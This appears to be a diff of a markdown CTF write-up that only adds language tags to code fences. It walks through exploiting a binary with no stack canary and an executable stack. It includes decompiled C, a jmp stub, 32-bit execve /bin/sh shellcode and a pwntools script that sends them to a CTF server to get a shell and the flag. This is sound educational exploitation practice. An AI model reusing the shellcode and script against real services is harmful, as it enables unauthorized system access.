@@ -13,7 +13,7 @@ The best idea is to first get a basic idea of what security mesaures are already
 We can see that there are no stack canarries (so buffer overflows will be possible) as well as NX is disabled so the stack is executiable. 
 ### Getting a closer look
 As they didn't provide source code, let's get a better look at whats going on by firing up [Ghidra](https://ghidra-sre.org/)
-```
+```c
 int main() {
   char buf [5];
   char buf60 [60];
@@ -53,7 +53,7 @@ int main() {
 }
 ```
 The code looks pretty simple. It is contained entierly inside the main function which continually asks the user to pick an option that executes the desired function. Choosing "1" writes at most 10 bytes into buf10, "3" does the same for buf60, "2" does nothing for our purposes, and "4" *EXECUTES* buf10!
-```
+```c
 puts("Okay, I\'ll run the contents of your premium container!");
 fflush(stdout);
 code = buf10;
@@ -80,32 +80,32 @@ Clicking assemble gives us "\x89\xE8\x83\xE8\x52\xFF\xE0", the actual bytes of t
 ### Creating the exploit
 
 Using pwn tools we can easily create a connect script the connects to their server and gives it our juicy code. The script is as easy as defining some constants and importing pwn tools,
-```
+```python
 from pwn import *
 shell = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
 
 jmp60 = "\x89\xE8\x83\xE8\x52\xFF\xE0"
 ```
 Connectint to the remote server and waiting for the prompt,
-```
+```python
 r = remote("golf.virginiacyberrange.net", 40149)
 r.recvuntil(">")
 ```
 Choosing 1 and uploading the `jmp EBP-0x52` code
-```
+```python
 r.sendline("1")
 r.recvuntil("Go ahead and store your content:")
 r.sendline(jmp60)
 ```
 Choosing 3 and sending the shellcode,
-```
+```python
 r.recvuntil(">")
 r.sendline("3")
 r.recvuntil("Go ahead and store your content:")
 r.sendline(shell)
 ```
 And selecting 4 to run our jmp + shellcode:
-```
+```python
 r.recvuntil(">")
 r.sendline("4")
 print(r.recvline())
@@ -131,7 +131,7 @@ flag{ju5t_4_h0p_sk1p_and_4_jmp_to_exploit}
 ```
 
 Heres the entire script:
-```
+```python
 from pwn import *
 shell = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
 
